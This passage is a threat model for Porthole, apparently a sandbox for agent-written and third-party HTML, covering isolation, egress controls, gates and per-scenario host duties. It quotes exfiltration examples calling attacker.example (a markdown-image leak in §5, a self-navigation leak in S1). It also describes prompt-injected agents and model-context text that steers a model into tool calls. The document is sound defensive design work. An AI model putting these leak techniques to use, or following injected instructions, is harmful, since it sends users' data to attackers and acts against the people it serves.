# Threat model

What Porthole protects, from whom, and where that protection ends. For each use (S1–S7): what
Porthole guarantees, what the host must do, what is not guaranteed. Setup:
[ADOPTING.md](ADOPTING.md). How each defense works and which test proves it: [DESIGN.md](DESIGN.md).

**Status.** This describes the latest release. Changes: [CHANGELOG.md](../CHANGELOG.md); reasons:
[DECISIONS.md](DECISIONS.md).

## 1. Two layers

- **The display layer** shows untrusted HTML; most hosts need only this. From one config it puts
  content on an origin that isn't the host's, closes its network, runs a shell in its frame, gates
  the few host functions content may call (send a prompt, open a link, copy text, read the host's
  data), and writes the agent's manual. Presets: `inlineWidget`, `liveWidget`, `artifact`, `mcpApp`,
  `url`.
- **The app runtime**, off unless a config sets `runtime: "1"`, lets a page reach the host's
  services through `porthole.use(name)` (`user`, `comments`, `artifact`, `assets`, `db`), as far as
  its declaration and its viewer's level allow. It brings in the host's backend: who may call what,
  per version, revocation, each person's data. A host that only shows content can skip it, and this
  document's parts about it.

What each layer guarantees: [§7](#7-the-display-layer-and-the-app-runtime).

## 2. What is protected

| Asset | What an attacker wants from it |
| --- | --- |
| **The host** | Its DOM, cookies, session and origin: to read the app's data or act as the person in it. |
| **The person's data** | What the content shows them, and what they type into it. |
| **The model and its tools** | The model's context, and the power to send prompts and call tools in the person's name. |
| **The person's trust** | A convincing fake (a sign-in form, an "approve" button) that gets them to act. |
| **Availability** | Out of scope in the viewer's browser ([§5](#5-out-of-scope)). |

## 3. Who attacks

| | Attacker | Their code runs as | Scenarios |
| --- | --- | --- | --- |
| (a) | An agent steered by prompt injection, writing hostile content | the content of any display it writes | S1–S4 |
| (b) | A third-party MCP server | its MCP Apps view | S5 |
| (c) | The author of a page others open: a public link's author against its visitors, or a page on a sibling label of the same content domain | a served page | S3, S4, S6 |
| (d) | The app being previewed | an app on a content origin (url mode) | S6 |
| (e) | Other content on the same page | a sibling frame | S7, and S2 |

The agent is itself a trust boundary: what it writes is untrusted, and so is a library it loads from
an allowed CDN. The manual's advice to pin exact versions helps the agent; it is not a wall.

## 4. Two lines of defense

1. **Origin isolation, against attacks on the host.** Content runs on an origin never the host's: an
   opaque one (a `srcdoc` frame, `sandbox="allow-scripts"` and nothing else) or its own on a
   separate registrable domain (served pages). Same-origin policy denies it the host's DOM, storage,
   cookies and credentials; nothing secret of the host's is sent into the frame.
2. **Against leaking and deceiving**, which isolation doesn't stop:
   - *Closed egress* by default: the frame's CSP; the shell's defenses where a CSP doesn't reach
     (WebRTC, nested frames, resource hints); the embedding page's `frame-src` against the frame
     navigating itself away. In a page's own frames (`nestedFrames: "own"`, P128, the host's opt-in)
     the shell's defenses don't run, and the CSP alone closes the network.
   - *Gates*: everything beyond drawing is a host function the config declares, behind a user
     gesture, a person's confirmation, consent or a rate.
   - *Approvals outside the frame*: the host draws confirmations and consent where content can't
     draw over them.
   - *Fallbacks on Porthole's word only*: the host's fallback for a frame that showed nothing (a
     sign-in prompt or "you no longer have access", with a link) comes from Porthole's pages, never
     from content (P124, P125; url-mode apps aside, S6). A served display speaks only through its
     **door**, a page of Porthole's in a hidden frame no content can reach
     ([§7](#the-display-layer)).

The app runtime adds a third: **the host's API is the wall for its data.** Before any handler runs,
the bridge refuses a call the page didn't declare (`undeclared`) or the viewer's level doesn't
allow; the names a page declares in `data` hold with or without a viewer (P094). The host's API
checks again: a call reaching it another way can claim any viewer and any declaration.

**Tests** (DESIGN.md § "Egress hardening, each with its test"). The leak suite attempts each channel
from inside the content on Chromium, WebKit and Firefox. Most defenses have a negative control that
removes the defense to show its probes then fail; a control passes only when its marked probes
failed by their own assertion (P096). A release's gate needs every negative control to pass on all
three engines on its commit (P146). A pull request's CI runs the suite on Chromium, with no control.

## 5. Out of scope

Porthole does not protect against these.

- **Availability in the viewer's browser.** Content can loop, allocate without bound, or fill the
  content domain's cookies. There is no watchdog: only the load timeout watches a frame; nothing
  unloads one that stops answering or limits its CPU or memory. An opaque frame may share the host
  page's process (the browser decides), so its loop can stall the host's tab; a served frame is on
  another site, which site isolation puts in its own process. In scope (SECURITY.md): a page or
  request that can crash the host's server, and a message from content that makes the host's page do
  unbounded work. Through Porthole's Node adapter no request ends the process; on any runtime the
  issue endpoint reads at most 64 KiB of a body (P092). What content sends is read after its gate,
  into bounded text, and none of it throws out of an adapter (P095).
- **Browser bugs, and engines the leak suite doesn't run.** The walls are the browser's own
  (sandbox, CSP, same-origin policy, site isolation). The suite runs Chromium, WebKit and Firefox
  through Playwright; other engines, versions and embedded WebViews are untested. Side channels
  (timing, Spectre-class) are out too: an opaque frame sharing the host's process can learn about it
  that way; domain mode puts content on another site, in its own process under site isolation.
- **Markdown-image exfiltration in chat renderers** (the EchoLeak and CamoLeak class: a reply holds
  `![](https://attacker.example/?q=<secret>)` and the chat loads it). That is the chat rendering
  model text; Porthole's walls cover HTML handed to a display.
- **Deceptive content**, a fake sign-in form included. Porthole limits where what is typed into it
  can go and keeps the host's approvals outside the frame; it doesn't judge what content shows.
- **A display taking the keyboard** (accepted risk, P123, P149): content can move focus into its
  frame and get the keys typed after that, until the person clicks back. Porthole has no guard; why,
  and what holds: §7 "The keyboard".
- **A page asking at a moment it picks** (accepted risk, P149). Only `copyText` asks proof of a
  click: a page can call `sendPrompt`, `openLink`, `downloadFile`, `comments.open`,
  `artifact.publish` or `assets.delete` as it loads or on a timer. Each still ends at the person (a
  confirmation with the whole effect, or a composer that posts nothing by itself), within a rate,
  and declines mute the display: the cost is an interruption, which the host may refuse or space
  out. A click check proved little (any click on the host's page in the last 5 s passed it) and
  refused real clicks where the engine didn't pass the activation up.
- **Wrong results**: a chart with wrong numbers, a report saying false things.
- **Malicious prompts.** A gated `sendPrompt` hands the host's confirm function the whole text (the
  default dialog shows all of it); whether it is hostile is not Porthole's call, nor is text content
  puts in the model's context (S5).
- **The sense of a confirmed action.** A confirmation gets the call and its arguments. Whether it is
  wise is the person's decision; what the handler does is the host's.

## 6. Scenarios

| | Use | Preset and mode | Attackers | Use it today when |
| --- | --- | --- | --- | --- |
| [S1](#s1-inline-widgets-in-a-conversation) | Inline widgets in a conversation | `inlineWidget`, opaque | (a) | every page sends `embedderCsp` |
| [S2](#s2-live-widgets-content-that-reads-the-hosts-data) | Live widgets that read the host's data | `liveWidget` | (a), (e) | as S1, and the page follows S7 |
| [S3](#s3-private-artifacts) | Private artifacts | `artifact`, domain | (a), (c) | the content domain is the host's alone, the secret is random, `authorize` revokes |
| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | the host handles abuse |
| [S5](#s5-third-party-mcp-apps) | Third-party MCP Apps | `mcpApp` | (b) | the host shows a view's domains |
| [S6](#s6-previews-of-a-running-app) | Previews of a running app | `url` | (d), (c) | the code is the host's own |
| [S7](#s7-several-displays-on-one-page) | Several displays on one page | any | (e) | the page follows the composition rule |

### What every host must do

Whatever the use (how to wire each: [ADOPTING.md](ADOPTING.md)):

- **The page's CSP.** Send `displays.embedderCsp(…)` (the page's `frame-src`) on every page that
  shows displays, and run `defineHostConformance` against the real page in CI (why: S1).
- **Gates.** Keep the defaults. A capability's `gates` in a config replace its defaults whole, even
  `[]`; a preset's `options.capabilities` entry replaces the preset's whole entry, gates included
  (`liveWidget({ capabilities: { readData: {} } })` drops its consent).
- **Your own dialogs.** A confirmation or consent you draw needs the default dialog's protections:
  on the host's page outside every frame, the call's whole effect shown, Cancel focused, the accept
  button ignoring presses for 500 ms after it opens (so a click meant for the content can't land on
  it). The React binding's dialog does this for confirmations; consent is always the host's own UI.
  Your own copy notice shows what went on the clipboard (S1).
- **Content's text** (its errors, a blocked navigation's address, an annotation's quoted text): show
  it only as text, never as HTML.
- **Fallbacks.** Draw a frame's fallback (`frameFallback`'s words, or your own) from its `outcome`
  alone, never from a message read off the frame's window. Log the `frame-status` and `door` host
  errors and show nothing for them. What each outcome's word is worth: §7 "The host's fallback".
- **Annotations and find in page** (§7). Take reports as UI hints (where to draw, what to open),
  never as permissions, and put nothing in a mark the page may not know. A mark's place in the
  document (`documentRect`, with the report's `scroll`, P132), its last line's
  (`lastLineDocumentRect`, P133) and the point an element was picked at (`pointDocument`, P150)
  aren't clamped to the frame: clip what you draw from them to the frame's box, or to your own
  region beside it. The page reads every query your find bar sends
  (P131): declare `find` only for displays whose pages may learn what the person searches for (not a
  third-party app with egress, S5, unless you accept that). Take its counts as the bar's numbers,
  and open your bar on `findRequested`, nothing more.
- **Link labels** (§7, P151). Send only titles the person viewing may see and the page may learn:
  the page reads every label, and one with a way out can send them to its author. Label from your
  own list of what the page links to, for the document shown (a new run or other content forgets
  them; label each page again), never from anything the page says. Never treat a label, or
  `data-porthole-label`, as a trust signal: the page can rewrite, hide or fake one.
- **Guard a view a frame's report opens or moves** (`activated`, `anchored`, `selected`, `tracked`,
  `selectionTracked`): a comment's bubble, a composer, a card following its mark, a composer
  following the selection (P138). The page picks when and where it appears, moves it up to 60 times
  a second, and hides and reshows it with `inView`, so it can put it under a press meant for the
  content (a double click on the content's button whose second click lands on the bubble). Such a
  view, its menus and popovers included, portaled ones too (P105; code, the view `inert` while it
  arms: ADOPTING.md § Annotations):
  - takes no press of any kind for 500 ms after it appears or moves, nor one begun before (not a
    `click` only: menu triggers act on `pointerdown`, menu items click on a release);
  - opens beside the frame, not over the report's box, where the layout allows, and takes no focus
    when it opens;
  - has nothing one click away that posts, submits, resolves, deletes or discards (a draft's view,
    P107, too: no "Post" or "Submit review").

  Two exceptions to "no focus". *First (P112):* in a comment mode the person started (the host's own
  control, never a report), a composer their selection opens (`selected`) may take focus with
  `focusField` if all it can do is save a draft: nothing in it posts, submits or sends; Enter only
  adds the draft to the batch (only the host's own "Submit N" control, outside the composer,
  submits); it shows plainly that it is a draft; and the rest of the guard holds. The page still
  picks when `selected` comes, so it can steer the next keys into a draft the person sees and can
  discard, never send one. Otherwise it takes no focus. *Second (P134):* a host may move focus into
  a view a report opened if its own `document.activeElement` is this frame, the focus goes only to a container that takes no input
  (`tabindex="-1"`), never a field or button, and every control in the view that can write has the
  host's own gate, so a forged opening and the keys after it can't submit. The gate covers keys too:
  the view's key handlers and the host's page-wide shortcuts that write (an `r` that resolves,
  Cmd+Enter that posts) need it (P137). That is the host's duty; Porthole doesn't guarantee it.
- **The keyboard.** A display can take it (§7 "The keyboard"). Where a field must never lose a key
  to a page, show no untrusted display beside it. Move focus into a display with `display.focus()`,
  into your composer with `focusField(field)`, not the field's `focus()` (Firefox ignores that while
  a frame that takes focus back on its blur holds it).
- **`annotations.focusMark(id)`.** Call it only as the person's key closes your view of that mark.
  It can be dropped, silently (P135, P137): one that waits while the frame finds its marks, or
  reaches the frame over 100 ms after you sent it because its page is busy, lands only if the focus
  is in the frame by then, and normally it is on your `<body>`. If it is still there a moment later
  the person hasn't moved on: `display.focus()`, then `focusMark(id)` again. Check first: that move
  is yours, and after the person went on to a button of yours it takes the keyboard from them.
  Nothing leaks either way.
- **`appOrigins`** (`hostOrigins` in `/server`): list every app origin. Only those may frame
  content, are a frame's host (heard and told), and are checked against the content domain for a
  shared site.
- **`framedBy`** (P141). Where another app frames yours, name its origins in `framedBy`, never
  `appOrigins`: it may then be an ancestor of your frames, above your page, never their host; your
  page must still be the frame's parent. An outer page that frames content directly (with an address
  got elsewhere) is let in by the browser, but the frame takes nothing from it (no handshake, no
  host function), Porthole's pages tell it nothing, and it hears only content's own word to its
  parent (`*`), untrusted. Your app page's `frame-ancestors` is yours to set; Porthole never sends
  it. Name exact origins of that one product; drop them when it stops framing you.
- **The outer page** (P144). In that nesting (outer page, your app's page, content), content is a
  descendant of the outer page: it can `postMessage` the outer page (`top`) and every frame in its
  tree, and learn the outer page's origin (measured in Chromium and Firefox); no header stops that.
  Tell its authors: every message listener on the outer page and its frames must check
  `event.source` and `event.origin`, take a message only from the window and origin it expects (your
  app's page), and treat any other as content's untrusted word. By S7's rule, the widest network
  among the outer page's frames is content's way out.
- **The app runtime.** Run `defineRuntimeConformance` with `api` in CI (§7).

### S1. Inline widgets in a conversation

`presets.inlineWidget`: a card the agent wrote, drawn in an opaque `srcdoc` frame as it streams.

**Porthole guarantees**
- An opaque origin, `sandbox="allow-scripts"` only: no forms, popups, downloads, top or parent
  navigation; nothing of the host's DOM, storage or cookies.
- A closed network. The CSP has `default-src 'none'`, `connect-src 'none'` (until a capability or
  the egress config names an origin), `form-action 'none'`, `frame-src 'none'`, `base-uri 'none'`,
  `object-src 'none'`, `webrtc 'block'`, and no `'self'` anywhere. Before content runs the shell
  removes the `RTC*` constructors, drops nested frames, plugins and resource hints as they are
  inserted, and makes `document.open` and `write` throw. With `nestedFrames: "own"` (P128, off by
  default) it keeps `srcdoc` iframes and drops every other frame and plugin, a kept one too once a
  change would point it elsewhere.
- While it streams, drafts are drawn inert (no scripts, handlers or navigation); the whole runs
  once.
- Only the host functions the config declares exist, each behind its default gates:

  | Host function | Default gates |
  | --- | --- |
  | `sendPrompt` | the host's confirmation, given the whole text; 30 a minute |
  | `openLink` | a confirmation; http(s) only, no credentials in the URL; 30 a minute |
  | `downloadFile` | a confirmation; 30 a minute |
  | `copyText` | a gesture, 30 a minute; the host writes the clipboard |
  | `callTool` | a confirmation, 30 a minute |
  | `setModelContext` | 30 a minute, then the host's `show`: the person sees the whole update first |
  | `readData`, `subscribeData` | 120 and 60 a minute (`liveWidget` adds consent) |
  | `reportError` | 10 a minute |

- Without the host's confirm function, a call that needs a confirmation is refused (consent and
  `show` likewise). Three declined confirmations in a row mute the display's confirm-gated calls; at
  most 10 confirmations wait per display, more are refused (P095).
- Model context (`setModelContext`) goes only once `show` has shown it, after every other gate: text
  blocks and plain JSON, at most 20,000 characters, no invisible characters. The manual tells the
  agent it is the content's unconfirmed text, never instructions (P100).
- The shell takes messages only from its parent window, the host only from its frame's window and
  origin; both validate every message.
- A frame that navigates is started again, at most three times; the next navigation stops the
  display. A file set's display may first hold such a frame up to 2 s, in case it was a page of its
  own set, delivering nothing either way meanwhile (P098).

**The host must**
- Send the page's `frame-src` (`displays.embedderCsp(…)`; `frame-src 'none'` where all displays are
  opaque). It is the only wall against an opaque frame navigating itself away with data in the URL
  (`location = "https://attacker.example/?" + data`): the frame's CSP can't stop that, and the shell
  gets no navigation events in an opaque origin.
- Run `defineHostConformance` against its real page in CI: it runs the leak probes there,
  self-navigation included, and is the only check that the page sends that CSP (nothing checks it
  when a display mounts).
- Keep `anyHttps` off inline widgets: an image URL is a way out (P059).
- Show what a copy put on the clipboard. The React binding's toast shows at most its first four
  lines and 280 characters; a host's own `copyText` handler replaces the toast and must show it
  itself.

**Not guaranteed**
- On a page without that `frame-src`, a widget can send out whatever it was shown.
- With `nestedFrames: "own"` (P128, the host's choice), a `srcdoc` frame is a realm where none of
  the shell's defenses ran: WebRTC (a way past `connect-src`, closed only where an engine honors
  `webrtc 'block'`), resource hints, `document.write`, and `execCommand("copy")` and copy listeners
  from a click in it (text the person didn't choose on their clipboard, no notice). The CSP it
  inherits holds for the rest.
- `copyText` needs a gesture, not a confirmation: a widget can put text the person didn't choose on
  their clipboard when they click in it (pastejacking). The notice tells them.
- Shown isn't read: the person may not look at a model-context update, or not see an injection in it
  for what it is. Characters that draw blank (a no-break space, the wide spaces) pass, a few bits
  each, bounded by the length limit (P100, accepted). Opting out of `show` (`withoutShow: true`)
  lets content write text nobody saw into the model's turns (S5).
- The gesture check (`copyText`'s, and any a host names) reads the host page's
  `navigator.userActivation`, and passes in an engine without it. A gesture shows a moment of
  intent, not consent: the person may have clicked the host a moment before.
- `sendPrompt`, `openLink` and `downloadFile` ask no proof of a click: a widget can ask as it loads,
  bounded by the confirmation, the rate and the mute (§5).
- Availability ([§5](#5-out-of-scope)).

### S2. Live widgets: content that reads the host's data

`presets.liveWidget`: an inline widget showing the host's data, current, as the viewer may see it.

**Porthole guarantees**, with the preset's defaults (the host's duties below say what undoes them):
- No network of its own: the preset refuses an `egress` option and a capability's own `connect` or
  `resource` origins, and returns a frozen config (P103). Served, the only scripts it may load are
  Porthole's Chart.js and D3, from its own origin (`/__porthole/lib/`).
- Data only through the host: `readData` and `subscribeData`, each behind `consent` (asked once per
  display; without a consent function every data call is refused) and a rate (120 reads, 60
  subscriptions a minute). A refusal tells the widget why (`data: { code, message }`).
- A result the host pushes with `changed(result)` answers a later read only past `readData`'s own
  gates, as any read does (P094).
- Served, the shell cancels any navigation of the frame to another document except a page of its own
  file set, and tells the host (`navigationBlocked`, where `reportError` is declared).

**The host must**
- Decide in its handlers what a URI may name, with the viewer's rights: the URI is the content's
  word.
- Ask for consent in its own UI, and keep the answer per viewer and widget.
- Show opaque live widgets only on pages that frame no content origins: the page's `frame-src` is an
  opaque frame's only wall against navigating away.
- Not build a config of its own from the preset's (`{ ...presets.liveWidget(), egress }`, a
  capability with origins): that isn't the preset, and opens what it names.
- Not pass `readData` or `subscribeData` in `options.capabilities` without their gates: an entry
  there replaces the preset's, consent included.
- Follow the composition rule (S7): no url-mode or `anyHttps` displays on the same page.

**Not guaranteed**
- What a neighbouring frame does with data handed to it (S7).
- In an engine without the Navigation API, a served frame's navigation falls back to the page's
  `frame-src`: outside sites stay shut, other content origins don't (P079).
- `LIBRARY_CDNS` displays may share the page (ADOPTING.md) but reach nine origins: fetches, scripts,
  styles, fonts and images to four package CDNs (cdnjs, jsDelivr, unpkg, esm.sh), and scripts,
  styles or fonts from five more (Google Fonts' two, Tailwind's, jQuery's and Plotly's). Every such
  request's path is a narrow channel out, read by that CDN's operator (P048). Keep highly sensitive
  data off pages with them.

### S3. Private artifacts

`presets.artifact` with `isolation: "domain"`, served by the host kit to a signed-in viewer (setup:
[ADOPTING.md](ADOPTING.md) § 4, "The server"). A page's **clean address** is its address on its own
content origin (a path on `<label>.<content domain>`) with no ticket in it: the one a person opens
in a tab or shares. A framed page's **sealed files address** is `/__porthole/f/<sealed>/`, the
frame's session encrypted into the path, since WebKit keeps no cookie in a frame (P083).

**Porthole guarantees**
- An origin per storage scope on the content domain; by default its label is an HMAC of the scope
  under a key derived from the host's secret (120 bits). A label is an address, not a secret (a host
  may name labels itself, `prefixedName`): access is the ticket's and the cookie's job.
- `createContentHost` refuses a content domain that holds an app origin or may share a site with one
  (`ContentDomainError`), and a served mount refuses a content origin same-site with the app. With
  `health` configured, frames fall back to opaque while the content domain doesn't answer.
- Access: the host decides, Porthole carries the decision. A ticket of 160 random bits, stored only
  as a hash, used once, good for 60 seconds by default and 600 at most, becomes a signed cookie of
  that origin and instance: `HttpOnly`; `__Host-` under https; `Secure` under https and always in a
  frame; `SameSite=None; Partitioned` in a frame, `Lax` in a tab.
- Only cookies Porthole set are read as its own: under https only `__Host-porthole-` names, which no
  other label can set; the entered mark names its label. A session names its scope, signed, so
  another label's session is never read as this one's, under https or on loopback (P101).
- Pages, files and status pages carry their CSP in headers, and `X-Robots-Tag: noindex`.
  `frame-ancestors` names the app's origins only, then the host's `framedBy`, if any (P141:
  ancestors above the app's page, never its host). With `nestedFrames: "own"` (P128), a file set's
  files below its base also name the page's own origin, so its pages can frame them.
- Files come only from the version's manifest, typed by Porthole's table, `nosniff`; files other
  than pages are `Cross-Origin-Resource-Policy: same-origin`; a file set never registers a service
  worker; a page's CSP opens its own version's path, not its whole origin.
- A page's nested frames are all removed unless the host opts in (`nestedFrames: "own"`, P128). Then
  only an iframe of its version's own files or with `srcdoc` runs (a page of the set, with its own
  shell); every other frame (another site, another path, a scheme, an empty one) and plugin is
  removed, and the page's `frame-src`, which opens only its version's path, governs every navigation
  of its frames.
- With a per-request check (`authorize`), the host decides again on every request; a deny is a 403
  that says `denied`.

**The host must**
- Use the content domain for nothing else, and put it on the Public Suffix List when it can (P047).
- Give a secret of at least 32 random bytes (`npx porthole secret`). Porthole checks only its
  length, and with `health` configured the health route answers with a value derived from it, so a
  guessable secret can be tested offline.
- Give a per-request check (`authorize`) to revoke: sessions are signed and stateless, so without it
  a cookie is good for its whole life (an hour by default, up to 30 days). Leave its answers
  uncached (the default; `authorizeTtlSeconds`) or call `content.forget(…)` when revoking; otherwise
  a cached answer holds for up to that long.

**Not guaranteed**
- Until the content domain is on the PSL, its labels are same-site with each other (P047), so a page
  on one label can attack another (c). A domain-mode page has `allow-same-origin`, so it can set
  cookies for the whole content domain (in a frame, within what the browser allows a third-party
  frame). `__Host-` keeps them off its sessions' cookies, but:
  - on plain http (loopback dev only) the names have no prefix (WebKit keeps no `Secure` cookie on a
    tab there), so a page can plant a copy of a label's own session or entry nonce, for whoever
    hands it one: they are `HttpOnly` and never sent into a frame (P101);
  - in browsers that refuse no nameless cookie (older than RFC 6265bis), a page can plant a copy of
    a session it holds as `=__Host-porthole-…`; siblings can overflow the cookie jar or the header
    size (denial of service only);
  - enough large cookies make every request from that browser to the content domain too large to
    serve ([§5](#5-out-of-scope)).
- A sealed files address is a bearer credential for its version's files until the session ends
  (P083): anyone holding it can load them. For its first hour it opens on its own; after that only
  for the page's own loads (`Sec-Fetch-Site: same-origin`), which a client outside a browser can
  claim.
- A revocation reaches the next request, not a page already running, an open WebSocket, pinned files
  the browser cached (immutable for a year), or assets in bearer mode (§7).
- With `nestedFrames: "own"` (P128), a page has WebRTC (every iframe it keeps starts as an
  `about:blank` of its own origin, which it reaches first), and its `srcdoc` frames run none of the
  shell's defenses (S1). Its frames can't navigate out of its version's path; their sandbox is the
  page's.

### S4. Public links, and pages that are apps

A served artifact anyone with its link may open (the host's `access` returns `{ anonymous: true }`),
possibly under the app runtime. The riskiest use: the author may be the attacker (c), and its
readers are strangers.

**Porthole guarantees**
- A public grant opens documents, never url-mode apps.
- A public grant without a `level` has no viewer. Under a runtime such a page is refused the
  runtime's own host functions (`user`, `comments`, `artifact`, `assets`, `db`) and every method
  above `view`; with a declaration it reads only the `data` names it declared (P094; a `data`
  without a `resources` list names them all).
- The page is on a site that isn't the host's (its sibling labels share one until the content domain
  is on the PSL, S3). A label is one DNS label, never of the form IDNA reserves (`xn--`), so never
  punycode for another name. Pages say `noindex`. A file of a type Porthole doesn't know is served
  as a download.
- `authorize` is the host's takedown switch.
- An embedded document (P143, `Grant.embed`, only where the host set `embeds`) is anonymous, an
  artifact's page with no level or user; only its session's answers say `frame-ancestors *`. It
  names no host: it hears no one, Porthole tells no parent anything, no capability or runtime host
  function runs, and no door is minted. The flag is signed into the session and the sealed address.
  Every other session's answers are byte for byte what the server without `embeds` answers, even
  while an embed session of the same artifact exists; cookies stay host-only. The host kit never
  mints one from `access` (its issue endpoint and clean addresses refuse it, P145).
- A page opened in a tab of its own has its frame's powers and no more (P099). Its CSP header
  carries the frame's sandbox (scripts on its own origin; no popups, forms, downloads, browser
  dialogs, or navigation of another window, its opener's included). Its `Permissions-Policy` denies
  what the frame's `allow` doesn't grant (camera, microphone, location, full screen, passkeys,
  payments, sharing, the built-in AI models, and every other feature a frame lacks by default). The
  shell's own walls, the only ones on engines that don't apply that header (WebKit, Firefox):
  `window.open` answers null; picture-in-picture, devices, location, full screen, passkeys, the
  share sheet and payments (Apple Pay too) are refused at once; its navigation guard stops the page
  navigating itself away by `location` (set, `assign`, `replace`), a link, `navigation.navigate()`
  or `open(…, "_self")`, with no way to have one address checked and go to another (a link, in a
  shadow root too, is followed as it was when clicked; how: DESIGN.md § "Served content, each with
  its test"). `defineHostConformance`'s `served.domain.tab-*` cases check it through the host's real
  edge.

**The host must**
- Add what Porthole doesn't have: a notice that the page is user-made (an interstitial), a way to
  report it, and a takedown process.
- Keep public grants at `view` or without a level. Porthole sets no ceiling: a public grant may
  carry any level, up to `owner`, and a `user`, and then the page has a viewer at that level.
- On pages shared with signed-in people, not offer `db` writes and `user`, or gate them with
  `consent` or `confirm` (their defaults are rates only: 600 and 60 a minute).
- Rate-limit the issue endpoint (`rateLimit`: optional, per process). An anonymous request is keyed
  by an address the client can't set (P092): the socket's peer through Porthole's Node adapter,
  `CF-Connecting-IP` on Workers. Anywhere else, or behind proxies, every anonymous request shares
  one limit unless you set `rateLimit.trustedProxies` (only where the app is reachable through those
  proxies alone) or `rateLimit.key` (ADOPTING.md § 4, "The server").
- Check pages for secrets before publishing them: `lintContent` has no rule for credentials.
- Pass Porthole's `Content-Security-Policy` and `Permissions-Policy` headers on unchanged through
  any edge or proxy: on a tab they are the page's sandbox.
- For embeds (P143): mint `embed` from one route of yours alone (never a reader's ticket or door;
  with the host kit, `host.server.issue`, never `access`, P145), keep that route from widening
  grants, and blank a takedown within a bound you state (your `authorize` answers, cached or not).
  The embedding site sees the page load and hears what the page posts to its parent or top. The page
  learns where it is embedded (P145, measured in Chromium, Firefox and WebKit): its request's
  `Referer` names your outer page (its origin under the default referrer policy; Firefox also sends
  `Origin`), `document.referrer` says the same, and `location.ancestorOrigins` names every ancestor,
  the embedding site included. A page with any egress (a `connect-src`, an image source) can send
  that out; one with none can't. Treat where an embed is shown as known to its author.
- Treat a public link's clean address as a tab's (P125): to show what one names in a frame, resolve
  it through your issue endpoint (`client.resolve`, `<PortholeView address>`). Its refusals (signed
  out, denied, not found) are drawn as the fallback with no frame built; a `blocked` there is your
  backend's word, not the door's, so keep those answers as honest as the access decision.

**Not guaranteed**
- In a browser without the Navigation API (older Safari and Firefox), a page opened in a tab can
  navigate itself away with data in the address: the shell's guard gets no events there, and a tab
  has no embedding page whose `frame-src` would stop it. It can also go to a `blob:` document it
  wrote, where the shell never runs: the CSP and its sandbox carry over, the `Permissions-Policy`
  and the shell's walls don't (WebRTC is there, and a granted location). No CSP directive closes
  either (P099, accepted). A host that must cover such browsers shows public pages in its own frame.
- `db` and `user` reach the author without any network: the page can read what viewers write, and
  `user.get()`'s `{ id, name, level }`, and keep it in `db`. Closed egress doesn't cover a channel
  the host provides. Give `id` a per-artifact pseudonym (`pseudonymFor`), and decide what `name`
  says.
- Phishing ([§5](#5-out-of-scope)).

### S5. Third-party MCP Apps

`presets.mcpApp` through `/mcp`: a view from an MCP server the host doesn't control (b).

**Porthole guarantees**
- Porthole implements the host side itself, with one hardened frame: by default an opaque frame with
  the shell's defenses first in the view's document; with `isolation: "domain"`, behind the sandbox
  proxy on a content origin.
- The view's declared CSP becomes its egress: `connectDomains` to `connect-src`, `resourceDomains`
  to scripts, styles, images, fonts and media. Only exact origins (https or wss; http and ws on
  loopback only) and `*.` wildcards over a domain are taken; a wildcard over a single label or a
  public suffix Porthole knows, and anything else, is dropped. `frameDomains` and `baseUriDomains`
  are ignored. Served, the proxy's CSP comes from what the session carries, signed, never from a
  message.
- Default gates stricter than the spec's "MAY": `callTool`, `sendPrompt` and `openLink` each need a
  confirmation, at 30 a minute (S1). A gesture check a host names is the host's alone (the shell
  doesn't speak for an MCP view).

**The host must**
- Show the person the domains a view declares before mounting it (`readViewResource(…).egress` and
  `viewEgress()` give them; the spec says hosts SHOULD warn). Porthole has no prompt for it.
- Route `callTool` only to the view's own server, and refuse the tools the view may not call
  (`_meta.ui.visibility`): the host's `callTool` handler alone decides that.
- Keep `setModelContext`'s `show` gate. The React provider shows each update whole outside every
  frame (`ContextNotice`); a host's own `show` must too. Opt out (`withoutShow: true`) only where
  the handler itself puts the text in front of the person, or the content is the host's own (P100).
- Keep `callTool`'s confirmation. If the host's confirm says yes by itself and a view polls a tool
  more often than every 2 s, give `callTool` its own `gates` with a rate: they replace the default.

**Not guaranteed**
- Declaring is allowing: what the person sees or types in the view may go to its `connectDomains`.
- Code from `resourceDomains` runs in the frame (still isolated).
- Model context (`ui/update-model-context`) is shown before it goes, but showing isn't reading: text
  the person let pass can still steer the model into calling other tools, which the gates on the
  view's own calls don't catch. The manual's words (the content's unconfirmed text, never
  instructions) are the second wall (P100, accepted).
- The public suffixes Porthole refuses wildcards over are its own short list, not the whole PSL.

### S6. Previews of a running app

`presets.url`: a running app (a dev server's preview) framed by its URL (d).

**Porthole guarantees**
- Isolation: the app runs on a content origin, never the host's, in a frame with
  `sandbox="allow-scripts allow-same-origin allow-forms"`. A host may add popups (and popups that
  escape the sandbox), modals and downloads; top navigation never.
- Access: the same ticket and cookie as served pages. The upstream origin is fixed in the signed
  session; the viewer can't change it.
- Porthole's own cookies are removed before a request reaches the host's `upstream` (HTTP), and
  before the Node adapter hands a WebSocket to the host's `appSocket`.
- The app's cookie opens it only for its own origin (`Origin`, or `Sec-Fetch-Site` `same-origin` or
  `none`) and for a navigation that opens it (GET or HEAD); anything else another origin sends is a
  403 before the upstream. A WebSocket opens from its own origin only, through `content.access`,
  which the Node adapter asks before `appSocket` and a Worker asks on its own upgrade path (P101).
- `proxyTo`, Porthole's HTTP relay (pass it as `upstream`), also rewrites the headers: requests go
  with `redirect: "manual"`; `Host`, hop-by-hop headers, `X-Forwarded-*`, `Forwarded` and
  `X-Real-IP` are dropped; an `Origin` or `Referer` naming the content origin is rewritten to the
  app's, any other goes as sent (so an app that checks `Origin` sees a foreign one).

**The host must**
- Preview only code it trusts: the app gets no shell and no egress control (P020).
- Refuse, in its `instance` callback, upstream addresses it doesn't mean (loopback, private
  networks): Porthole takes any http(s) URL, and the client's proposal is untrusted (SSRF).
- In a relay of its own, rewrite the headers as `proxyTo` does (`upstreamHeaders.request(headers, {
  origin, target })`). A WebSocket relay that takes the access from `content.access(request)` gets
  the browser's whole `Cookie` header, Porthole's cookies included: send the app the headers
  `upstreamHeaders.request(…, { websocket: true })` makes (Porthole's cookies removed, the upgrade's
  own headers kept).
- Keep previews off pages with displays that read data (S7).
- Never put a preview's outcome in the same place in your UI as a served display's: a served
  display's `blocked` comes only from its door or your issue endpoint (P125), a url-mode app's from
  the app.

**Not guaranteed**
- The app's network is its own.
- So is its word about how it loaded. It shares its origin with Porthole's entry page and status
  pages and has no shell to speak first, so it can make the display's `outcome` any `blocked`, with
  any code, and the host show its fallback ("open this in a new tab to sign in") with a link out of
